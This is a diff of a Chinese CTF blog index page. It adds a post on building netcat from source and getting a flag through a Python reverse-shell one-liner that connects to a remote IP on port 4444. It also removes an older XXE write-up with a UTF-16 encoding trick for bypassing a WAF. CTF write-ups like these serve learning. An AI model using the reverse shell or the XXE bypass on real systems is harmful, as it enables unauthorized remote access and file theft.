@@ -158,6 +158,84 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/26/1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/26/1/" class="post-title-link" itemprop="url">1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-26 22:23:00 / 修改时间：22:36:26" itemprop="dateCreated datePublished" datetime="2021-03-26T22:23:00+08:00">2021-03-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="服务器部署netcat："><a href="#服务器部署netcat：" class="headerlink" title="服务器部署netcat："></a>服务器部署netcat：</h4><p>翻了好几个博客总结的，用起来很丝滑：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">下载源码包：wget https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;netcat&#x2F;files&#x2F;netcat&#x2F;0.7.1&#x2F;netcat-0.7.1.tar.gz</span><br><span class="line"></span><br><span class="line">解压安装包，tar -zxvf netcat-0.7.1.tar.gz</span><br><span class="line"></span><br><span class="line">移动文件到&#x2F;usr&#x2F;local下，mv netcat-0.7.1 &#x2F;usr&#x2F;local&#x2F;netcat-0.7.1</span><br><span class="line"></span><br><span class="line">重命名：</span><br><span class="line">cd &#x2F;usr&#x2F;local</span><br><span class="line">mv netcat-0.7.1 netcat</span><br><span class="line"></span><br><span class="line">编译：make</span><br><span class="line"></span><br><span class="line">安装：make install</span><br><span class="line"></span><br><span class="line">环境变量暂时未配置成功，但仍可使用，此时：</span><br><span class="line">sudo which nc 应可以看到 bin&#x2F;nc</span><br><span class="line">使用bin&#x2F;nc即可使用nc命令</span><br></pre></td></tr></table></figure>
+
+<p>：</p>
+<img src="/images/1/image-20210326222805812.png" alt="image-20210326222805812" style="zoom:80%;" />
+
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>虽说靶机上有nc，但一直没有成功……</p>
+<p>这里推荐：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5768#toc-3">https://xz.aliyun.com/t/5768#toc-3</a> 很详细</p>
+<p>php也可反弹，但是是瞬间反弹……这里用的是python反弹：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;139.224.100.60&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>远程服务器监听4444端口：</p>
+<p><img src="/images/1/image-20210326223239023.png" alt="image-20210326223239023"></p>
+<p>反弹成功</p>
+<p><img src="/images/1/image-20210326223300541.png" alt="image-20210326223300541"></p>
+<p>执行命令cat flag即可……</p>
+<p><strong>好耶！白嫖阿里云服务器真香！！🐕</strong></p>
+<blockquote>
+<p>It is uneasy right??!</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/21/De1CTF-2019-SSRF-Me/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -985,110 +1063,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/09/xctf-unagi/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.jpg">
-      <meta itemprop="name" content="inanb">
-      <meta itemprop="description" content="铁马冰河入梦来">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="inanb">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/09/xctf-unagi/" class="post-title-link" itemprop="url">xctf-unagi</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-03-09 17:11:09 / 修改时间：17:53:27" itemprop="dateCreated datePublished" datetime="2021-03-09T17:11:09+08:00">2021-03-09</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="xctf-unagi"><a href="#xctf-unagi" class="headerlink" title="xctf-unagi"></a>xctf-unagi</h4><h6 id="1-题目："><a href="#1-题目：" class="headerlink" title="1.题目："></a>1.题目：</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p>进入题目是一个网站导航，有一个上传点：</p>
-<img src="/images/xctf-unagi/image-20210305175148141.png" alt="image-20210305175148141" style="zoom:80%;" />
-
-<p>上传新用户到系统……here中是：</p>
-<img src="/images/xctf-unagi/image-20210305175416023.png" alt="image-20210305175416023" style="zoom:80%;" />
-
-<p>大概是一个xml的界面，演示了xml格式的用户数据，也就是需要我们上传类似的xml文件来上传新用户。</p>
-<p><img src="/images/xctf-unagi/image-20210309171219845.png" alt="image-20210309171219845"></p>
-<p>about中提示，应当读取/flag文件</p>
-<blockquote>
-<p>我一直很困惑于DTD这个东西，即使实体，也是规范……</p>
-</blockquote>
-<p><img src="/images/xctf-unagi/image-20210309171739424.png" alt="image-20210309171739424"></p>
-<p>内部实体，规定了xml的几个元素，与元素的属性：</p>
-<p><img src="/images/xctf-unagi/image-20210309171912700.png" alt="image-20210309171912700"></p>
-<p>下面的xml数据需要根据DTD已有的定义（“规范”）来组织（这样的标签才会被正确解析？），DTD也可以是外部独立的，便于多个xml格式的文档引用</p>
-<blockquote>
-<p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>eg：</p>
-<p><img src="/images/xctf-unagi/image-20210309172332031.png" alt="image-20210309172332031"></p>
-<p>（include？</p>
-</blockquote>
-<p>xxe的朴素运用，就是利用实体，读取内部敏感文件：</p>
-<p><img src="/images/xctf-unagi/image-20210309172756732.png" alt="image-20210309172756732"></p>
-<p>根据提示的xml结构，构造数据：</p>
-<img src="/images/xctf-unagi/image-20210309173533674.png" alt="image-20210309173533674" style="zoom:80%;" />
-
-<blockquote>
-<p>除了intro标签其他都有长度限制</p>
-<p>intro标签可以在User界面找到</p>
-<p>cred标签么有显示，大概是php代码不对这个标签识别</p>
-</blockquote>
-<p>上传后发现有waf阻挡</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4059">绕过WAF保护的XXE</a>中介绍了编码绕过，有效waf不支持一些编码，可以轻松绕过</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://mohemiv.com/tags/xxe/">https://mohemiv.com/tags/xxe/</a> 这个更详细，可惜全英……</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf8 -t utf16 1.xml&gt;2.xml</span><br></pre></td></tr></table></figure>
-
-<p>转换后上传，即得到flag</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-19">xxe深度学习</a></p>
-<blockquote>
-<p>如果目标网站能访问外网，访问个人服务器上的dtd，操作大概会更多一些？……</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1160,7 +1134,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">61</span>
+          <span class="site-state-item-count">62</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
